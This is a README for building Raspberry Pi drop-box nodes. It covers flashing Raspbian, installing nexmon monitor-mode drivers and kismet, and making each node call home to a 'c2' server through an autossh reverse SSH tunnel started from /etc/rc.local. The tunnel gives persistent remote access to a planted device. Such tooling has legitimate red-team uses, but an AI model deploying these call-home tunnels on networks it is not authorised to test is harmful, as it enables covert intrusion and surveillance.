# shells-on-cells

# Hardware

Raspberry Pi Zero W or Raspberry Pi3B (Raspberry Pi3B+ not yet compatible)

# Build rpi Image on Mac

Download Raspberian:
https://www.raspberrypi.org/downloads/raspbian/

Select RASPBIAN STRETCH 

Download latest-raspbian-stretch.zip and unarchive it, delete the archive, then use: laatest-raspbian-stretch.img in the next step

Open a terminal window and type:

$ diskutil list

Find the disk with the label you want: 

/dev/disk0 (internal, physical):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:      GUID_partition_scheme                        *800.2 GB   disk0
   1:                        EFI WRONG_DISK              209.7 MB   disk0s1
   2:          Apple_CoreStorage WRONG_DISK              799.3 GB   disk0s2
   3:                 Apple_Boot WRONG_DISK              650.0 MB   disk0s3

/dev/disk1 (internal, virtual):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:                  Apple_HFS WRONG_DISK             +798.9 GB   disk1
                                 Logical Volume on disk0s2
                                 00000000-0000-0000-0000-000000000000
                                 Unlocked Encrypted

/dev/disk2 (external, physical):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:     FDisk_partition_scheme                        *15.8 GB    disk2
   1:               Windows_NTFS WRONG_DISK              15.8 GB    disk2s1

*/dev/disk3 (external, physical):
   #:                       TYPE NAME                    SIZE       IDENTIFIER
   0:     FDisk_partition_scheme                        *31.9 GB    disk3
   1:             Windows_FAT_32 RIGHT_DISK              43.5 MB    disk3s1
   2:                      Linux                         31.9 GB    disk3s2

Find the disk you want and use:
(In my example my usb adapted for SD cards at this moment is /dev/disk3)

$ diskutil unmountDisk /dev/rdisk3

To unmount the selected disk you want

$ sudo dd bs=8m if=~/Downloads/2017-11-29-raspbian-stretch-lite.img of=/dev/rdisk3

After you put in your password it will work silently until it produces the following output:

221+1 records in
221+1 records out
1858076672 bytes transferred in 399.146789 secs (4655121 bytes/sec)

The drive will mount drop an empty "ssh" file into the root of the boot partition, and upon first boot the rpi will be in headless mode for the next steps in the configuration.



# Node Setup


Put the SD into the PI boot the pi and give it ethernet and you should be able to find it and ssh to it.
*If using a raspberry pi zero use this guide to get it up and running using the OTG port: https://learn.adafruit.com/turning-your-raspberry-pi-zero-into-a-usb-gadget/ethernet-gadget

Default User: pi
Default Pass: raspberry

Upon first login you get a warning to update the password

$ passwd

Use raspi-config to configure network before boot, and hostname

$ sudo raspi-config

Select Option 2, N1, then set hostname

Select Option 3, B2, Yes, Ok

Select Option 5, P6, No, Yes, Ok

Select Finish

When you exit it will ask to reboot, go ahead and reboot and reconnect
You should be connecting with your new password and the hostname should be changed

# Run Install Scripts

The first script will update your pi and delete and regenerate host keys

$1stboot.sh 

The second script downgrade the kerel to 4.14 currently the latest supported nexmon drivers

$2ndboot.sh

Third script is fun tools, prerequesuites for driver installation, and kernel source

$preinstall.sh

This last script downloads nexmon from git, and builds the drivers only run the one for your device noted by filename, must be run as root

#postinstall-pizerow.sh
#postinstall-pi3.sh

Lastly there's a kismet script that install's kismet stable and you user pi to the kismet group

$ kismetinstall.sh

# Now Make SSH Keys For node and copy them off so you have them. 

mkdir ~/.ssh
chmod 700 ~/.ssh
ssh-keygen -f ~/.ssh/ptdb_name_rsa -t rsa -b 4096 -N ''

Edit the following configuration files with the configurations:

sudo nano /etc/rc.local    Use /etc-rc.local

autossh -fN -R <ptdb port>:localhost:<c2 port for ptdb> <c2 user>@<c2 domain> -p <c2 port for ssh> -i /home/pi/.ssh/<nodename_rsa> &


Replacing the <ptdb port> with this ptdb's port that it will communicate to c2 with
Replace <c2 port for ssh> with the port the c2 does com over
Replace <c2 port for ptdb> with port number on c2 to use for this node
Replace <c2 user> with the username the n0d3z should call home too
Replace <c2 domain> with the domain or IP of the c2

sudo nano /etc/network/interfaces    Use /etc-network-interfaces

sudo nano /etc/ssh/ssh_config      Use /etc-ssh-ssh_config ptdb

sudo nano /etc/ssh/sshd_config       Use /etc-ssh-sshd_config ptdb

# Now SSH to c2 with the same ssh command from yoursystem$, add fingerprint when prompted.

sudo nano /etc/ssh/ssh_config      Use /etc-ssh-ssh_config c2

sudo nano /etc/ssh/sshd_config       Use /etc-ssh-sshd_config c2

yoursystem$ ssh <c2 user>@<c2 domain> -p <c2 port for ssh> -i ~/.ssh/<c2key or ptdbkey>

c2$ ssh pi@localhost -p <c2 port for ptdb> -i ~/.ssh/<ptdbkey>

Reboot and netstat your c2 for your ptdb's

# C2 Configuration 

configure ssh enabled user
Copy node keys to ~/.ssh/
Open ssh port to machine
Disable password auth via ssh
Enable key-based login

Test Connection

$ netstat -an |grep <c2 port for ptdb> 











